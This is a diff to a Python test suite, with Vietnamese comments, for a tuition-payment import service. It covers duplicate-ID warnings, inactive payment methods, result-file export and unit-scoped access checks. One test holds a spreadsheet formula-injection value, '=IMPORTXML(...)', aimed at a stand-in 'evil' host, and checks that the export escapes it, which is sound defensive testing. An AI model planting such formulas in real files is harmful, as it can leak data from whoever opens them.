@@ -492,6 +492,12 @@ class TestBuildTemplate:
 
 
 class TestResolveValidate:
+    @pytest.fixture(autouse=True)
+    async def _methods(self, db):
+        # G2: resolve nay validate hình thức ACTIVE → seed cash (active) cho mọi test.
+        # KHÔNG seed bank_transfer → dùng để test method inactive/missing.
+        await _seed_cash_method(db)
+
     async def test_matched_single_invoice(self, db, seeded_dependencies):
         await _seed_tuition(
             db,
@@ -604,7 +610,8 @@ class TestResolveValidate:
             1,
             None,
         )
-        assert res.rows[0].status == MATCHED
+        assert res.rows[0].status == WARNED  # G1: trùng CCCD+cùng tiền → cảnh báo
+        assert "nghi copy" in res.rows[0].message
         assert res.rows[1].status == ERROR  # 6tr > 4tr còn lại
         assert "vượt tổng còn nợ" in res.rows[1].message
 
@@ -734,11 +741,92 @@ class TestResolveValidate:
         assert res.rows[0].status == WARNED
         assert "lệch xa năm học" in res.rows[0].message
 
+    async def test_g1_duplicate_cccd_same_amount_warns_copy(
+        self, db, seeded_dependencies
+    ):
+        # G1: 2 dòng cùng CCCD + CÙNG số tiền (nghi copy nhầm → thu khống) → cả 2 WARNED,
+        # message "nghi copy". Cả 2 vẫn lọt nợ (10tr) nên không bị chốt "vượt nợ" bắt.
+        await _seed_tuition(
+            db,
+            seeded_dependencies,
+            citizen_id="001234567890",
+            invoices=[(1, "10000000", "issued", "0", "0")],
+        )
+        res = await pis.resolve_and_validate(
+            db,
+            [
+                _draft("001234567890", "1000000", row_no=2),
+                _draft("001234567890", "1000000", row_no=3),
+            ],
+            2026,
+            1,
+            None,
+        )
+        assert res.rows[0].status == WARNED
+        assert res.rows[1].status == WARNED
+        assert "nghi copy" in res.rows[0].message
+        assert res.warned_count == 2 and res.matched_count == 0
+
+    async def test_g1_duplicate_cccd_diff_amount_warns_not_copy(
+        self, db, seeded_dependencies
+    ):
+        # G1: cùng CCCD KHÁC số tiền (tách đợt hợp lệ) → WARNED "kiểm tra trùng", KHÔNG "copy".
+        await _seed_tuition(
+            db,
+            seeded_dependencies,
+            citizen_id="001234567890",
+            invoices=[(1, "10000000", "issued", "0", "0")],
+        )
+        res = await pis.resolve_and_validate(
+            db,
+            [
+                _draft("001234567890", "1000000", row_no=2),
+                _draft("001234567890", "2000000", row_no=3),
+            ],
+            2026,
+            1,
+            None,
+        )
+        assert res.rows[0].status == WARNED
+        assert "kiểm tra trùng" in res.rows[0].message
+        assert "copy" not in res.rows[0].message
+
+    async def test_g2_method_inactive_is_error(self, db, seeded_dependencies):
+        # G2: hình thức map-OK theo text (bank_transfer) nhưng PaymentMethod INACTIVE trong
+        # DB → ERROR ngay ở preview (đối xứng commit:1017, hết "khớp giả"). Parser :346 đã
+        # chặn text lạ; đây test nhánh inactive/missing.
+        db.add(
+            PaymentMethod(
+                code="bank_transfer", name="CK", is_online=False, is_active=False
+            )
+        )
+        await db.flush()
+        await _seed_tuition(
+            db,
+            seeded_dependencies,
+            citizen_id="001234567890",
+            invoices=[(1, "10000000", "issued", "0", "0")],
+        )
+        res = await pis.resolve_and_validate(
+            db,
+            [_draft("001234567890", "1000000", method="bank_transfer")],
+            2026,
+            1,
+            None,
+        )
+        assert res.rows[0].status == ERROR
+        assert "kích hoạt" in res.rows[0].message
+
 
 # =============================================================================
 # create_preview_batch / preview_import (DB persistence)
 # =============================================================================
 class TestPreviewBatch:
+    @pytest.fixture(autouse=True)
+    async def _methods(self, db):
+        # G2: preview_import → resolve nay cần hình thức ACTIVE → seed cash.
+        await _seed_cash_method(db)
+
     async def test_preview_import_persists_batch_and_rows(
         self, db, seeded_dependencies, admin_user
     ):
@@ -1752,3 +1840,142 @@ class TestListBatches:
 
         items_all, total_all = await pis.list_batches(db, unit_id=None)
         assert total_all == 2
+
+
+# =============================================================================
+# BV-5 R2/R1 — build_result_file + get_batch_detail_scoped
+# =============================================================================
+_sha_seq = iter(range(10000, 99999))
+
+
+async def _mk_user(db, *, username, unit_id, role="accountant"):
+    from app.security import get_password_hash
+
+    u = models.User(
+        username=username,
+        email=f"{username}@t.local",
+        password_hash=get_password_hash("X123!abcd"),
+        full_name=username,
+        role=role,
+        status="active",
+        unit_id=unit_id,
+    )
+    db.add(u)
+    await db.flush()
+    return u
+
+
+async def _mk_batch_with_row(
+    db, *, creator_id, status, raw, row_status="matched", payment_ids=None, amount="1000000"
+):
+    batch = PaymentImportBatch(
+        academic_year=2026,
+        semester_no=1,
+        file_name="x.xlsx",
+        file_sha256=f"sha-{next(_sha_seq)}",
+        status=status,
+        row_count=1,
+        matched_count=1 if row_status != ERROR else 0,
+        warned_count=0,
+        failed_count=1 if row_status == ERROR else 0,
+        total_amount=Decimal(amount),
+        created_by_id=creator_id,
+    )
+    db.add(batch)
+    await db.flush()
+    row = PaymentImportRow(
+        batch_id=batch.id,
+        row_no=2,
+        citizen_id="001234567890",
+        raw=raw,
+        status=row_status,
+        amount=Decimal(amount),
+        message="",
+        payment_ids=payment_ids or [],
+    )
+    db.add(row)
+    await db.flush()
+    return batch
+
+
+class TestResultFileAndDetail:
+    async def test_build_result_file_sanitizes_formula_injection(
+        self, db, seeded_dependencies, admin_user
+    ):
+        # 🔴 P1: ô raw mở đầu '=' (=IMPORTXML) PHẢI ra TEXT ('=...) trong file kết quả,
+        # KHÔNG để openpyxl/Excel diễn giải thành công thức.
+        evil = '=IMPORTXML("http://evil/x","//a")'
+        batch = await _mk_batch_with_row(
+            db,
+            creator_id=admin_user.id,
+            status="committed",
+            raw={pis.COL_CCCD: "001234567890", pis.COL_NAME: evil},
+            payment_ids=[101],
+        )
+        content, media, fname = await pis.build_result_file(db, batch.id, "csv", None)
+        text = content.decode("utf-8")
+        # sanitize = prepend ' (CSV escape inner quotes "→"" nên chỉ check prefix).
+        assert "'=IMPORTXML" in text  # đã thành TEXT, không phải =IMPORTXML sống
+        assert ",=IMPORTXML" not in text  # KHÔNG có công thức sống ở đầu field
+        assert fname.endswith(".csv")
+        assert "Đã ghi" in text  # nhãn committed
+
+    async def test_build_result_file_xlsx_no_live_formula(
+        self, db, seeded_dependencies, admin_user
+    ):
+        from openpyxl import load_workbook
+
+        batch = await _mk_batch_with_row(
+            db,
+            creator_id=admin_user.id,
+            status="committed",
+            raw={pis.COL_CCCD: "001234567890", pis.COL_NAME: "=1+1"},
+            payment_ids=[101],
+        )
+        content, _, fname = await pis.build_result_file(db, batch.id, "xlsx", None)
+        assert fname.endswith(".xlsx")
+        wb = load_workbook(io.BytesIO(content))
+        ws = wb.active
+        # KHÔNG có ô nào là công thức sống (data_type 'f').
+        for row in ws.iter_rows():
+            for c in row:
+                assert c.data_type != "f", f"ô {c.coordinate} là formula sống!"
+
+    async def test_build_result_file_void_labels_da_dao_not_thanh_cong(
+        self, db, seeded_dependencies, admin_user
+    ):
+        # 🔴 P2: lô VOID → nhãn "Đã đảo" (tiền đã rút lại), KHÔNG "Thành công".
+        batch = await _mk_batch_with_row(
+            db,
+            creator_id=admin_user.id,
+            status="void",
+            raw={pis.COL_CCCD: "001234567890", pis.COL_NAME: "Nguyễn Văn A"},
+            payment_ids=[101],
+        )
+        content, _, _ = await pis.build_result_file(db, batch.id, "csv", None)
+        text = content.decode("utf-8")
+        assert "Đã đảo" in text
+        assert "Thành công" not in text
+
+    async def test_get_batch_detail_scoped_idor(self, db, seeded_dependencies):
+        # IDOR: lô do user unit 1001 tạo → manager unit 2002 KHÔNG xem được (404).
+        creator = await _mk_user(db, username="acc1001", unit_id=1001)
+        batch = await _mk_batch_with_row(
+            db,
+            creator_id=creator.id,
+            status="committed",
+            raw={pis.COL_CCCD: "001234567890"},
+        )
+        # khác đơn vị → ResourceNotFoundError
+        with pytest.raises(pis.ResourceNotFoundError):
+            await pis.get_batch_detail_scoped(db, batch.id, unit_id=2002)
+        # cùng đơn vị → OK
+        b, rows = await pis.get_batch_detail_scoped(db, batch.id, unit_id=1001)
+        assert b.id == batch.id and len(rows) == 1
+        # admin (None) → OK
+        b2, _ = await pis.get_batch_detail_scoped(db, batch.id, unit_id=None)
+        assert b2.id == batch.id
+
+    async def test_get_batch_detail_scoped_not_found(self, db, seeded_dependencies):
+        with pytest.raises(pis.ResourceNotFoundError):
+            await pis.get_batch_detail_scoped(db, 999999, unit_id=None)
